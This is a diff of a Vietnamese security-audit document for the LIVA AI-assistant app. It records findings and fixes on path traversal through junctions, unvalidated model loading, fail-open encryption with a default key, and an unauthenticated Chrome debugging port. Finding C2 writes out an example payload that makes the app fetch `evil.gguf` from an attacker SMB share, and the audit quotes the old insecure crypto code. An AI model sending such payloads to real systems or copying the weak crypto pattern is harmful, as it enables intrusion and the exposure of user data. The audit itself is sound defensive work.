-không có `..`, không tuyệt đối, và nằm dưới gốc vault — **chỉ đĩa mới biết nó dẫn đi đâu**. Trên
-Windows đường này rẻ đến mức đáng lo: `mklink /J` **không cần quyền admin**.
-
-Lớp ba hỏi filesystem thay vì hỏi chuỗi, và có hai ngữ nghĩa cố ý khác nhau để `write_markdown` vẫn
-tạo được file mới: đích **đã tồn tại** thì canonicalize trọn đích; đích **chưa tồn tại** thì lần
-ngược lên tổ tiên tồn tại gần nhất, canonicalize tổ tiên đó, rồi mới cho phép phần đuôi (phần đuôi
-không thể chứa `..` — lớp một đã chặn). Lần hết lên tới gốc mà không có gì tồn tại ⇒ **TỪ CHỐI**,
-không phải cho qua.
-
-Một chi tiết dễ làm hỏng khi sửa sau này: hàm vẫn trả về đường dẫn **ghép theo chữ**, không phải bản
-canonical — canonical trên Windows mang tiền tố verbatim `\\?\`, mà `search_vault` còn
-`strip_prefix(&self.vault_path)` trên kết quả. Canonical dùng để *phán quyết*, không dùng để *trả về*.
-
-Test hồi quy: `liva-native-core/tests/mcp_vault_sandbox_escape.rs` (229 dòng).
-
-**Vẫn KHÔNG đóng §C1.** Đây là hàng rào bên trong hai lệnh vault, không phải xác thực trên đường
-WS 8002. Đề xuất (3) — allow-list lệnh theo kênh — **vẫn chưa làm**.
-
-### C2. `llm:swap_model` nạp file tùy ý từ đường dẫn do client cung cấp
-
-**Bằng chứng:** `lib.rs:1265-1281`
-
-```rust
-let model_path_str = payload["model_path"].as_str().ok_or_else(|| "Missing 'model_path'")?;
-let model_path = std::path::Path::new(model_path_str);
-...
-llm_manager.swap_model(model_path, n_ctx, n_gpu_layers, vocab_only).await?;
-```
-
-Không canonicalize, không kiểm prefix, không giới hạn trong `ai.localModelsDir`. So sánh: MCP có guard chống traversal (`mcp/server.rs:66-77`) — ở đây thì **không có gì**.
-
-**Hệ quả:** Ghép với C1, trang web bất kỳ đẩy `{"command":"llm:swap_model","payload":{"model_path":"\\\\attacker\\share\\evil.gguf"}}` → LIVA tải file từ SMB của kẻ tấn công và ném vào parser GGUF viết bằng C++ (llama.cpp). Đây là bề mặt memory-corruption trực tiếp. Ngay cả không có C1, `update_config` (`lib.rs:404-427`) cũng cho ghi `ai.localModelsDir` + `ai.routerModel` tùy ý rồi `load_configured_router_model(state, true)` tự nạp (`lib.rs:419-424`) — `configured_router_model_path()` chỉ làm `Path::new(dir).join(model)` (`lib.rs:137`), không kiểm gì.
-
-**Đề xuất:** Canonicalize và bắt buộc `starts_with(models_root)`; chỉ nhận **tên file** (không nhận đường dẫn), tra trong thư mục model đã cấu hình; từ chối UNC/absolute.
-
-### C3. `EncryptionEngine` — khóa mặc định công khai, không KDF, giải mã **fail-open**
-
-**Bằng chứng:** `liva-native-core/src/crypto.rs:15-21`
-
-```rust
-pub fn new(key_str: &str) -> Self {
-    let mut key = [0u8; 32];
-    let bytes = key_str.as_bytes();
-    let len = bytes.len().min(32);
-    key[..len].copy_from_slice(&bytes[..len]);   // không KDF, pad bằng 0x00
-    Self { key }
-}
-```
-
-- Mặc định khóa: `"00000000000000000000000000000000"` tại `main.rs:62-63` **và** `liva-desktop/src-tauri/src/lib.rs:270-271` → key thực = `0x30` lặp 32 lần, ai cũng đoán được.
-- Passphrase ngắn (ví dụ `"liva"`) → key = `6c 69 76 61` + **28 byte 0x00**, entropy ~32 bit.
-- `crypto.rs:50-88` — `decrypt()` trả `String`, **không phải `Result`**. Mọi lỗi (hex sai, IV sai độ dài, **xác thực GCM thất bại**) đều `return text.to_string()` — trả lại chính ciphertext. Không log, không phân biệt được. Xác minh lại tại chỗ: cả 5 nhánh `Err(_) => return text.to_string()` (`crypto.rs:57-67`), guard `iv_bytes.len() != 16 || tag_bytes.len() != 16` (`crypto.rs:69-71`) và nhánh cuối `Err(_) => text.to_string()` (`crypto.rs:86`) đều fail-open.
-
-**Hệ quả:** (a) DB `facts.value` coi như không mã hoá với cấu hình mặc định. (b) Toàn vẹn **không bao giờ được thực thi**: kẻ tấn công sửa DB → decrypt "thành công" trả về chuỗi rác, chuỗi đó đi thẳng vào prompt LLM. (c) Đổi `LIVA_ENCRYPTION_KEY` → mọi fact cũ im lặng biến thành ciphertext hex nhồi vào prompt, không cảnh báo.
-
-**Đề xuất:** Dùng KDF thật (Argon2id/HKDF) từ passphrase + salt lưu trong DB; **bỏ default key** — thiếu key thì fail-fast lúc boot; đổi chữ ký thành `decrypt(&self) -> Result<String, DecryptError>` và bắt caller xử lý; thêm version-tag vào ciphertext để phát hiện đổi khóa.
-
-**Tiến độ (22/07/2026) — phần lớn C3 đã xử lý:**
-
-1. **KDF THẬT + salt.** `encrypt` nay sinh định dạng **v2**: `v2:salt:iv:tag:cipher`, khoá = **HKDF-SHA256(passphrase, salt ngẫu nhiên mỗi bản ghi)** thay cho kiểu cũ lấy thẳng bytes key pad `0x00`. Hai plaintext giống nhau ra ciphertext khác nhau. (`crypto.rs`, `hkdf`+`sha2`.)
-2. **Nâng cấp dữ liệu cũ KHÔNG mất mát.** `db::migrate_facts_encryption` chạy một lần lúc boot (`main.rs`, Tauri `lib.rs`): giải mã fact v1 bằng khoá cũ rồi **mã hoá lại thành v2**, trong một transaction. Idempotent; plaintext cũ để nguyên; dữ liệu hỏng/sai khoá KHÔNG đụng (tránh mất bản gốc). Test khoá lại cả bốn nhánh.
-3. **Primitive fail-CLOSED** `try_decrypt(&self) -> Result<String, DecryptError>` phát hiện sửa đổi (`AuthFailed`) — có test lật một byte.
-
-**Vá thêm sau vòng PHẢN BIỆN ĐỐI KHÁNG (14 agent tấn công, 22/07/2026):**
-
-4. **Đường ĐỌC rò ciphertext khi sai khoá → mất-dữ-liệu.** Phản biện bắt được: `get_fact`/`get_memory_data` dùng `decrypt` fail-open. Đổi `LIVA_ENCRYPTION_KEY` (vd lần đầu đặt khoá sau khi chạy bằng mặc định) → AuthFailed → trả **nguyên ciphertext** làm value, chảy vào prompt LLM + UI không cảnh báo; nếu bị `set_fact` ghi lại thì lồng 2 lớp, **mất bản gốc vĩnh viễn** dù khôi phục đúng khoá. **Đã vá:** hai đường đọc dùng `decrypt_read` — sai khoá/giả mạo (`AuthFailed`/`NotUtf8`) trả `""` + WARN, KHÔNG rò ciphertext; plaintext-lookalike ngắn (`NotEncrypted`/`BadFormat`) vẫn passthrough. Có test. **Đánh đổi cố ý (phản biện vòng 2):** plaintext cũ *tình cờ đúng khuôn v1 hoàn chỉnh* `<32hex>:<32hex>:<hex chẵn>` (vd 2 mã MD5 nối bằng `:`) qua kiểm định dạng, fail AES-GCM → `AuthFailed` → trả `""` thay vì passthrough. KHÔNG khử được: tại `AuthFailed`, "plaintext giống ciphertext" và "ciphertext thật sai khoá" bất khả phân; ưu tiên KHÔNG rò ciphertext (ca đổi khoá phổ biến) hơn giữ plaintext-lookalike (cực hiếm với facts ngôn ngữ tự nhiên). Bản gốc vẫn trên đĩa, chỉ mất nếu người dùng thấy `""` rồi `set_fact` đè. Đã khoá bằng test `decrypt_read_plaintext_giong_v1_tra_rong` — coi là giới hạn có chủ đích, không phải bug hở.
-5. **Migration lost-update giữa hai tiến trình.** Nếu gateway + Tauri cùng chạy trên default DB, tiến trình B đọc v1 (bước 1, đã nhả lock) rồi tiến trình A ghi `set_fact` bản mới; bước 2 của B `UPDATE ... WHERE key` **đè mất bản mới**. **Đã vá:** `UPDATE ... WHERE key=? AND value=?bản_đã_đọc` — value đổi thì khớp 0 dòng, bỏ qua. Có test.
-6. **Khoá mặc định biến KDF thành bảo mật ảo.** HKDF với passphrase là hằng số công khai `"0"×32` thì khoá dẫn xuất ai cũng tính được. **Đã giảm nhẹ:** `EncryptionEngine::new` **cảnh báo LỚN** khi dùng khoá mặc định (không còn im lặng).
-
-**Vá thêm — BỎ KHOÁ MẶC ĐỊNH + fail-closed (22/07/2026, thiết kế qua workflow phản biện đối kháng):**
-
-7. **Bỏ khoá mặc định — khoá thiết bị DPAPI + rekey không mất dữ liệu.** Cả hai đường boot (`main.rs`, vỏ Tauri) không còn fallback `"0"×32`; thay bằng `resolve_and_rekey` (`lib.rs`, dùng chung chống drift): khoá thật lấy từ `LIVA_ENCRYPTION_KEY` (nếu ≠ mặc định) → **khoá thiết bị 32 byte niêm phong bằng Windows DPAPI** (`keystore.rs`, sinh mới nếu chưa có, ghi atomic `create_new`). Khoá mặc định KHÔNG bao giờ là khoá GHI nhưng là **khoá phụ để CỨU** cùng `LIVA_ENCRYPTION_KEY_OLD`: `db::rekey_facts_encryption` giải bằng chúng rồi mã lại dưới khoá thật — máy đang chạy khoá mặc định tự chuyển facts sang khoá thật lúc boot, **không mất**. Tiêu chí idempotent = "live giải được", KHÔNG phải `starts_with("v2:")` (bẫy mất-dữ-liệu). Khoá sinh mới được **escrow 1 lần** (stderr / dialog Tauri) để backup, khôi phục qua `LIVA_ENCRYPTION_KEY`. Non-Windows: env-only.
-8. **`get_fact` fail-CLOSED có phân loại.** `read_fact`/`FactRead::{Ok,Locked}` (`crypto.rs`) thay `decrypt_read` gộp `""`; `get_memory_data` gắn cờ `locked` per-fact (value luôn `""`, không rò ciphertext) + `lockedFactsCount`, không rớt hàng; UI hiện badge 🔒 + banner. **Chốt chống-mất ở TẦNG GHI, không phải UI:** `set_fact` **backup-before-overwrite** (sao lưu ciphertext locked vào `facts_locked_backup` trước khi đè — chặn consolidation/LLM đè bản gốc); `delete_memory_fact` (arm MỚI) **từ chối xoá hàng locked** ở tầng lệnh (cả caller không-UI). Toàn bộ có test; quyết định đánh đổi (kể cả plaintext-lookalike-v1) gộp một chỗ `read_fact`.
-
-**CÒN LẠI (cố ý):** kho plaintext ngoài `facts` (`vectors_meta.content`, FTS, checkpoint và `turn_layer_nodes` nếu dùng sau này) chưa mã hoá — "strict" hiện chỉ đúng cho bảng `facts`. Writer event-ledger tự động để `rawUserMsg/rawAiReply=NULL`, nên không tạo thêm bản plaintext ở `events`. Escrow: nếu người dùng chọn KHÔNG backup thì DPAPI vẫn là điểm hỏng đơn khi cài lại Windows.
-
-Định dạng ciphertext (`iv:tag:data` hex), phạm vi mã hoá (chỉ 3 chỗ) và sơ đồ mã hoá đầy đủ nằm ở tài liệu tầng dữ liệu.
-
-> 📌 Nguồn đầy đủ: [Tầng dữ liệu và bảo mật](../01-ban-ve/07-tang-du-lieu-va-bao-mat.md)
-
----
+**Rủi ro còn lại có chủ đích:** loopback remote không cần bearer vì chỉ nhận allow-list
+hẹp; một tiến trình độc hại đã chạy cùng user vẫn nằm ngoài trust model beta. Bearer
+non-loopback là shared secret, chưa phải device identity/mTLS. Đây là residual risk đã
+ghi trong [threat model](../05-chat-luong/threat-model.md), không phải trạng thái “WS mở
+toàn bộ command plane” như snapshot lịch sử.
 
 ## 2. HIGH
 
@@ -336,7 +183,7 @@ pub fn new(key_str: &str) -> Self {
 | ~~**H5**~~ ✅ **ĐÃ SỬA 23/07/2026** | Panic-on-boot: DB, LLM manager, phụ thuộc cứng `vec0.dll` | Thiếu `vec0.dll` hoặc DB khoá/hỏng → crash im lặng lúc khởi động, không màn hình lỗi | **Đã vá cả 3 phần:** (1) **binary standalone** — 3 điểm boot dùng `die()`/`die_db()` (0.6): stderr có hành động cụ thể + exit(1), không backtrace; (2) **vỏ Tauri** — `die_tauri_boot` hiện **MessageBox lỗi boot** (dùng chung `db_error_hint`: gợi ý `npm ci` khi thiếu vec0) thay vì panic im lặng, cho DB/LLM; (3) **đóng gói vec0** — `db::vec0_candidate_paths` nay thêm candidate **cạnh executable + `resources/`** (không phụ thuộc cwd/node_modules) + `tauri.conf.json` `bundle.resources` đưa `vec0.dll` vào installer. Runtime candidates có test; phần bundle chỉ verify đầy đủ được bằng `tauri build`. **Chưa làm:** chế độ suy giảm memory-only (thiếu vec0 vẫn chặn boot, chỉ khác là báo rõ) |
 | ~~**H6**~~ ✅ **ĐÃ SỬA 22/07/2026** | **Không có hệ thống migration DB** | `SCHEMA_VERSION = 3` (`db.rs:413`) + `MIGRATIONS: &[(i64, &str)]` (`db.rs:422`) + `run_migrations` (`db.rs:450`): đọc `PRAGMA user_version`, áp tuần tự từng migration **trong transaction**, đóng dấu version sau mỗi bước | DB cũ (`user_version = 0` nhưng đủ bảng baseline) được **đóng dấu lên 1 không mất dữ liệu**; DB từ bản LIVA **mới hơn** bị **từ chối tường minh** (`db.rs:453`) thay vì chạy mù trên schema lạ | **Kiểm chứng sống 26/07/2026:** khởi động lõi trên DB trống in đúng `DB migration: đã nâng schema lên version 2` rồi `version 3`. Có test hồi quy cho cả hai chiều (nâng cấp giữ dữ liệu; từ chối DB tương lai) |
 | ~~**H7**~~ ✅ **ĐÃ KHÉP 23/07/2026** | Bộ nhớ dài hạn từng không nối vào đường hội thoại | Recall/persist scoped chạy trên ba cửa vào; event + vector/FTS ghi atomic; projection consumer có checkpoint, retry/DLQ và chạy ở hai runtime | Producer, recall và projection finalization đã có; semantic extraction/L3 vẫn là khoản nợ riêng | Tiếp theo: Reflection/fact-relation extraction từ event đã finalized |
-| **H8** 🆕 **27/07/2026** | **Cổng CDP 9222 mở ra một phiên Facebook đã đăng nhập, và CDP không có xác thực** | `integrations/messenger.rs` nối `127.0.0.1:<LIVA_MESSENGER_CDP_PORT>` (mặc định **9222**); `scripts/messenger-chrome.ps1` khởi động Chrome với `--remote-debugging-port` + `--user-data-dir` riêng | CDP **không xác thực theo thiết kế**: mọi tiến trình cục bộ nối được cổng đó đều lái được trình duyệt — đọc và gửi tin nhắn, đi tới trang bất kỳ, đọc cookie phiên. Đây là cùng lớp rủi ro với [C1](#c1-websocket-8002-không-xác-thực--lộ-toàn-bộ-tập-lệnh-ipc) nhưng ở một cổng khác, và **không** được allow-list `Origin` của LIVA che — hàng rào đó bảo vệ 8002, không bảo vệ 9222. Cửa sổ phơi bày kéo dài đúng bằng thời gian Chrome đó còn mở | Tắt Chrome debug ngay sau khi gửi xong, đừng để chạy nền cả ngày. Nếu tính năng này thành thường trực: cân nhắc để LIVA **tự khởi động và tự tắt** Chrome quanh mỗi lần gửi, thay vì trông vào người dùng nhớ đóng |
+| **H8** 🆕 **27/07/2026** | **Cổng CDP 9222 mở ra một phiên Facebook đã đăng nhập, và CDP không có xác thực** | `integrations/messenger.rs` nối `127.0.0.1:<LIVA_MESSENGER_CDP_PORT>` (mặc định **9222**); `scripts/messenger-chrome.ps1` khởi động Chrome với `--remote-debugging-port` + `--user-data-dir` riêng | CDP **không xác thực theo thiết kế**: mọi tiến trình cục bộ nối được cổng đó đều lái được trình duyệt — đọc và gửi tin nhắn, đi tới trang bất kỳ, đọc cookie phiên. Đây là cùng lớp rủi ro với [C1](#c1-websocket-8002--identity-và-authorization-đã-khép-31072026) nhưng ở một cổng khác, và **không** được allow-list `Origin` của LIVA che — hàng rào đó bảo vệ 8002, không bảo vệ 9222. Cửa sổ phơi bày kéo dài đúng bằng thời gian Chrome đó còn mở | Tắt Chrome debug ngay sau khi gửi xong, đừng để chạy nền cả ngày. Nếu tính năng này thành thường trực: cân nhắc để LIVA **tự khởi động và tự tắt** Chrome quanh mỗi lần gửi, thay vì trông vào người dùng nhớ đóng |
 | ~~**H10**~~ ✅ **ĐÃ SỬA 27/07/2026** | **Database đi theo thư mục chạy — mất dữ liệu người dùng, im lặng** | `boot.rs` từng giải `"data/agents/liva_core/…"` theo cwd. Ba database cùng tồn tại thật trên một máy: gốc repo 32 KB · `liva-desktop/src-tauri` 32 KB · `liva-native-core` **118 KB** | Thêm một liên hệ vào sổ danh bạ rồi khởi động LIVA bằng cách khác ⇒ danh bạ **trống**, LIVA nói "chưa có ai tên đó". **Không lỗi, không log, không có gì để lần ra** — đây là dạng tệ nhất: dữ liệu không hỏng, nó chỉ ở một file khác. Đã cắn ba lần trong một buổi | **Đã làm:** neo vào `crate::data_dir()` (thư mục chứa `data/liva-config.json`, hoặc `%LOCALAPPDATA%\LIVA\data` khi không có cây mã nguồn); `LIVA_DB_PATH` vẫn thắng. Thấy database ở chỗ khác thì **WARN kèm đường dẫn + kích thước, KHÔNG tự di trú** — gộp hai file SQLite là thao tác mất mát tiềm tàng. Có test khoá bất biến "khác cwd ⇒ cùng một database", đã kiểm bằng mutation |
 | **H9** 🆕 **27/07/2026** | Tự động hoá Messenger **vi phạm điều khoản Meta** — rủi ro khoá tài khoản là thật | `integrations/messenger.rs` (docstring tự ghi rõ điều này) | Đây là rủi ro **tài khoản người dùng**, không phải rủi ro kỹ thuật của LIVA, nên không sửa được bằng code. Facebook không có API cho tin nhắn cá nhân, nên lái giao diện là đường duy nhất — ràng buộc của nền tảng, không phải lựa chọn kiến trúc | Không giấu. Module đã tự ghi; **README và mọi phát biểu ra ngoài cũng phải ghi** trước khi beta tester bật nó. Một người mất tài khoản Facebook vì một tính năng họ không biết là có rủi ro thì đó là lỗi truyền đạt, không phải lỗi của họ |
 
@@ -453,7 +300,7 @@ let action = if text_lower.contains("on") { Some("on") }
 
 **Bằng chứng (bản cũ, giữ để đối chiếu lịch sử):** ~~`db.rs:188-354`~~ từng là một `execute_batch` duy nhất toàn `CREATE TABLE IF NOT EXISTS`, không `PRAGMA user_version`, không bảng `schema_migrations`, không một câu `ALTER TABLE` nào.
 
-> 📌 Nguồn đầy đủ (ERD, 15 bảng, PRAGMA, pool SQLite): [Tầng dữ liệu và bảo mật](../01-ban-ve/07-tang-du-lieu-va-bao-mat.md)
+> 📌 Nguồn đầy đủ (ERD 20 bảng, PRAGMA, pool, migration): [Persistence runtime](../03-he-thong-con/persistence.md)
 
 ### H7. Bộ nhớ dài hạn không được nối vào đường hội thoại chính — **ĐÃ KHÉP 23/07/2026**
 
@@ -513,7 +360,7 @@ Ba câu hỏi rút ra, dùng được cho mọi phép kiểm về sau:
 | Số `0` ở đây nghĩa là "đo được 0" hay "không đo được"? | Gộp hai nghĩa là cách chắc chắn nhất để đỏ trên máy rảnh |
 | Hạn thời gian này đang đo **công việc** hay đang đo **lịch trình**? | Đo lịch trình thì nó nhấp nháy theo tải máy, không theo mã nguồn |
 
-Cách kiểm trước khi push, đã dùng thật và bắt được lỗi ngay lần đầu — dựng worktree sạch rồi chạy cổng ở đó ([§1 của backlog nâng cấp](05-nang-cap-toan-dien.md#1-đường-cơ-sở-đã-đo--29072026-tại-c6ec120)). Lưu ý giới hạn: worktree bắt được nhóm (1) — thứ *thiếu file* — nhưng **không** bắt được (2) và (3), vì cả hai phụ thuộc **tải máy lúc chạy**, không phụ thuộc nội dung cây thư mục.
+Cách kiểm trước khi push, đã dùng thật và bắt được lỗi ngay lần đầu — dựng worktree sạch rồi chạy cổng ở đó ([§1 của backlog nâng cấp](05-nang-cap-toan-dien.md#1-đường-cơ-sở-đã-đo--29072026-tại-c6ec120-đo-lại-đủ-thay-bảng-2607)). Lưu ý giới hạn: worktree bắt được nhóm (1) — thứ *thiếu file* — nhưng **không** bắt được (2) và (3), vì cả hai phụ thuộc **tải máy lúc chạy**, không phụ thuộc nội dung cây thư mục.
 
 > 📌 Nguồn đầy đủ (workflow từng bước, những gì CI KHÔNG làm, 3 cách bypass hook): [Kiểm thử và CI](../02-van-hanh/04-kiem-thu-va-ci.md)
 
@@ -638,7 +485,7 @@ Ký hiệu: **ĐÃ NỐI [OK]** = có call-site trong `src/` ngoài test/bin · 
 | `tts` | `main.rs:117-125`, `pipeline.rs`, `lib.rs` | **[OK]** ĐÃ NỐI | |
 | `tts::vieneu` | `tts/mod.rs:157` gated | **[MỘT PHẦN]** OPT-IN (`LIVA_TTS_VIENEU`, mặc định `false`) | `tts/mod.rs:157-161` |
 | `tts::style_vector` | Chỉ `TtsManager::from_wav` (`tts/mod.rs:318`) — mà `from_wav` **0 caller** | **[THIẾU]** MỒ CÔI (dây chuyền) | `from_wav` tại `tts/mod.rs:305`, grep toàn repo 0 caller kể cả bin/test |
-| `webrtc::frame` | `main.rs:501,570`, `pipeline.rs:382,454` | **[OK]** ĐÃ NỐI | |
+| `webrtc::frame` | `liva-native-core/src/websocket.rs:433-468,570`, `pipeline.rs:382,454` | **[OK]** ĐÃ NỐI | |
 | `webrtc::vad` | `main.rs:152-164, 627` | **[OK]** ĐÃ NỐI (bật nếu có model) | |
 | `webrtc::denoise` | `main.rs:181-209, 617` | **[OK]** ĐÃ NỐI (opt-out `LIVA_DENOISE_ENABLED=0`) | |
 | `webrtc::aec` | `main.rs:234-238`; `pipeline.rs:367` | **[MỘT PHẦN]** OPT-IN (`LIVA_AEC_ENABLED`, mặc định `false`) | `main.rs:234` `env_flag("LIVA_AEC_ENABLED", false)` — từ 21/07/2026 nhận `1/true/yes/on`, không còn so cứng `Ok("1")` |
@@ -647,8 +494,8 @@ Ký hiệu: **ĐÃ NỐI [OK]** = có call-site trong `src/` ngoài test/bin · 
 | ~~`webrtc::signaling`~~ | — | **ĐÃ XOÁ 22/07/2026** | File `src/webrtc/signaling.rs` bị xoá ở commit `510c9e2` (mục 3.1) — lý do phụ: nó `bind("0.0.0.0")`. `src/webrtc/mod.rs` nay chỉ còn 6 module (`frame`, `vad`, `denoise`, `turn_shadow`, `aec`, `pipeline`) |
 | `integrations::smart_home` | `build_pipeline_graph` (`agent/graph.rs`), `handle_command` (`integration:smart_home_control`, `integrations:list`), **và** tool MCP `control_smarthome` (`mcp/server.rs`) | **[MỘT PHẦN]** ĐÃ NỐI ở ba đường; `execute` chưa có I/O phần cứng nhưng **báo trung thực**, có test ép | Ba đường vào nay đi qua **cùng một** `execute` nên cho cùng một câu trả lời (`45e2e58`); kiểm lại 26/07/2026 |
 | `integrations::os_control` | **Chỉ một đường**: tool MCP `control_volume` / `control_media` (`mcp/server.rs`), tới được qua `mcp:call_tool` và qua vòng tool-calling. Nằm trong `NATIVE_AUTOEXEC` | **[MỘT PHẦN]** — chạy thật (U19, `6b5b87b`), nhưng **chỉ Windows** và **không** có mặt trong `integrations:list` | Tích hợp **đầu tiên chạm được vào máy thật**. Ngoài Windows trả lỗi thẳng, không im lặng no-op. Nghiệm thu **toàn tuyến 14/14** (10 câu OS: 10/10), hồi quy G1 13/13. Nhưng đường **LLM đơn thuần chỉ 9/10** — 10/10 đạt được nhờ `route_intent` chặn câu đa nghĩa trước, **không phải model khá lên**. Xem thêm M10 |
-| `telegram` | `main.rs:333` | **[MỘT PHẦN]** OPT-IN (`TELEGRAM_BOT_TOKEN` phải có) + **vòng lặp không khép kín** (§5.4) | |
-| `mcp::server` | `main.rs:171` + `lib.rs:44` (nhét vào `AppState`), **và nay có arm IPC**: `lib.rs:1575` `"mcp:list_tools"`, `lib.rs:1578-1593` `"mcp:call_tool"` | **[OK]** ĐÃ NỐI ở tầng IPC (từ mục 2.7) — nhưng chưa client nào gọi hai lệnh này | `list_tools()`/`call_tool()` (`mcp/server.rs:39,79`) có caller production; kiểm lại 22/07/2026 |
+| `telegram` | `liva-native-core/src/boot.rs:401-428` | **[MỘT PHẦN]** OPT-IN (`TELEGRAM_BOT_TOKEN` phải có) + **vòng lặp không khép kín** (§5.4) | |
+| `mcp::server` | `main.rs:171` + `lib.rs:44` (nhét vào `AppState`), **và nay có arm IPC**: `liva-native-core/src/lib.rs:1467-1468` `"mcp:list_tools"`, `liva-native-core/src/lib.rs:1470-1494` `"mcp:call_tool"` | **[OK]** ĐÃ NỐI ở tầng IPC (từ mục 2.7) — nhưng chưa client nào gọi hai lệnh này | `list_tools()`/`call_tool()` (`mcp/server.rs:39,79`) có caller production; kiểm lại 22/07/2026 |
 | `mcp::client` | `handle_command`: `mcp_client:list_servers`, `mcp_client:list_tools`, `mcp_client:call_tool` | **[OK]** — **KHÔNG còn mồ côi từ 26/07/2026** | Viết lại thành **MCP client stdio thật** (G0, `8e7511f` + `4f5e326`, ~1 035 dòng). Có e2e với server `npx` thật: `tests/mcp_client_e2e.rs` (`ba_lenh_mcp_client_da_noi_vao_dispatch`, `vong_doi_mcp_server_ngoai`) — 4/4 đạt ngày 26/07/2026. Bản trước ghi 49 dòng mồ côi; đã lỗi thời |
 | `mcp::protocol` | `Tool/ToolList/CallToolRequest/CallToolResult/ToolContent` dùng bởi `server.rs`; **`JsonRpcRequest/JsonRpcResponse/JsonRpcNotification/JsonRpcError` = 0 tham chiếu toàn repo** | **[THIẾU]** MỒ CÔI (một nửa file) | grep 4 tên struct này ngoài `protocol.rs` → rỗng |
 | `agent::state` | `pipeline.rs:259` | **[OK]** ĐÃ NỐI | |
@@ -703,8 +550,8 @@ Quét tự động toàn `src/`, loại trừ `#[cfg(test)]`, `tests/`, `src/bin
 | `SelfCorrectionLoop::with_max_retries` | `evolution/mod.rs:100` | chỉ `tests/` — **feature-gate** |
 | `AgentDispatcher::register_agent` | `agent/dispatcher.rs:37` | chỉ `tests/` — **feature-gate** |
 | `StateGraph::add_edge` | `agent/graph.rs:40` | **`build_pipeline_graph` không gọi `add_edge` lấy một lần** (grep `add_edge` trong `graph.rs` = 1 hit duy nhất, chính là dòng định nghĩa) ⇒ field `edges` chỉ sống trong test |
-| ~~`NativeMcpServer::list_tools`~~ | `mcp/server.rs:39` | **hết mồ côi** — `lib.rs:1575` (`mcp:list_tools`) |
-| ~~`NativeMcpServer::call_tool`~~ | `mcp/server.rs:79` | **hết mồ côi** — `lib.rs:1593` (`mcp:call_tool`) |
+| ~~`NativeMcpServer::list_tools`~~ | `mcp/server.rs:39` | **hết mồ côi** — `liva-native-core/src/lib.rs:1467-1468` (`mcp:list_tools`) |
+| ~~`NativeMcpServer::call_tool`~~ | `mcp/server.rs:79` | **hết mồ côi** — `liva-native-core/src/lib.rs:1489-1494` (`mcp:call_tool`) |
 | ~~`ProcessWrapper::{send_request, read_response}`~~ | — | **Hai hàm này KHÔNG CÒN TỒN TẠI** (26/07/2026, rung G0): `mcp/client.rs` đã được viết lại thành `McpStdioClient` + `McpClientRegistry`. Mọi toạ độ cũ trỏ tới chúng đều vô nghĩa |
 | ~~`JsonRpcResponse::error`~~ | `mcp/protocol.rs:60` | **hết mồ côi** (26/07/2026) — `client.rs:645` dùng nó để trả lỗi cho mọi request đang chờ khi server đóng stdout. Và cả 4 kiểu `JsonRpc*` nay đều có ref ngoài `protocol.rs`: `JsonRpcRequest` (`client.rs:313`), `JsonRpcNotification` (`client.rs:350`), `JsonRpcError` (`client.rs:689`) |
 | `VisionManager::{capture_screen, detect_changes}` | `vision/mod.rs:93,99` | logic bị chép lại inline ở `lib.rs:300-325` |
@@ -721,9 +568,13 @@ Quét tự động toàn `src/`, loại trừ `#[cfg(test)]`, `tests/`, `src/bin
 
 Tauri chỉ là passthrough thuần ở tầng lệnh: `native_ipc_call(command, payload)` → `handle_command(...)` (`liva-desktop/src-tauri/src/lib.rs#native_ipc_call`). Nên so khớp chuỗi lệnh giữa hai bên là kiểm tra hợp lệ. *(Từ 26/07/2026 tầng KHỞI ĐỘNG cũng dùng chung — `boot::build_app_state` — nên hai vỏ không chỉ giống nhau ở tập lệnh mà còn ở tập dịch vụ nền.)*
 
-**(a) 22 sự kiện UI gửi mà core không có arm** ⇒ luôn nhận `Unknown command` (`lib.rs:1483`) — gồm gần như toàn bộ nhóm skill (`test_skill`, `toggle_skill`, `reload_skills`), nhóm huấn luyện giọng (`start/stop_voice_training`, `select_voice_profile`), nhóm bộ nhớ (`consolidate_memory`, `reset_memory`, `delete_memory_fact`) và nhóm avatar/env config. Đáng chú ý: `select_voice_profile` chết trong khi `get_voice_profiles` sống (`lib.rs:473-488`, chỉ `read_dir("data/voices")`) ⇒ **liệt kê được profile giọng nhưng không chọn được**.
+**(a) Frontend vẫn có event legacy không khớp handler**, nhưng snapshot grep “22 event”
+đã bị loại vì đếm sai tên truyền qua biến và từng báo oan cả nhóm memory. Catalog hiện hành
+có 76 command/11 miền; 11 command memory đều có owner. Các ví dụ còn cần xử lý theo
+test adapter/dispatcher là `select_voice_profile`, `save_env_config` và một số thao tác
+avatar/skill legacy.
 
-> 📌 Nguồn đầy đủ (bảng 42 lệnh `handle_command` + danh sách đủ 22 sự kiện UI không có handler): [Giao thức IPC và WebSocket](../01-ban-ve/02-giao-thuc-ipc-va-websocket.md)
+> 📌 Nguồn hiện hành: [Giao thức IPC và WebSocket](../01-ban-ve/02-giao-thuc-ipc-va-websocket.md)
 
 **(b) 14 lệnh core không client nào gọi.** Grep chuỗi lệnh trong `liva-ui/src` + `liva-desktop/src-tauri/src` = 0 hit:
 
@@ -745,7 +596,7 @@ UI chỉ dùng đúng 2 chuỗi có dấu hai chấm: `'vision:ask'` và `'visio
 | `mobile_client/src/components/MemoryTaskBoard.vue:310` `memory:set_fact` với `{ key, value }` | 2 field | `serde_json::from_value::<db::Fact>` — struct 13 field **không có `#[serde(default)]`** (`db.rs:360-374`: `createdAt`, `updatedAt`, `source`, `importance`, `confidenceScore`, `memory_strength`, `last_accessed_at`, `access_count`…) | `Err("Invalid fact payload: missing field createdAt")` |
 | `mobile_client/src/App.vue:217` `voice:stt_stop` | — | `lib.rs:1205` | OK |
 
-**(d) Telegram: 3 lệnh ghi ra stdout mà không ai đọc.** `telegram.rs:384` gửi `{"command":"telegram:message", …}`, `telegram.rs:124` gửi `{"command":"panic"}`, `telegram.rs:164-172` gửi `"voice:tts_stop"` — nhưng `ipc_tx` chính là kênh **ghi ra stdout** (`main.rs:317` → writer task `main.rs:344-356`). Không có vòng lặp back nào. Hơn nữa `handle_command` **không có arm `"telegram:message"`** (grep toàn repo: chỉ `telegram.rs:384`) và **không có arm `"panic"`**. ⇒ `/ask`, `/panic`, tin nhắn text Telegram: bot nhận, ghi 1 dòng JSON ra stdout, hết. Không tiến trình cha nào tồn tại (`scripts/start_all.ps1` không khởi động binary `liva-native-core`).
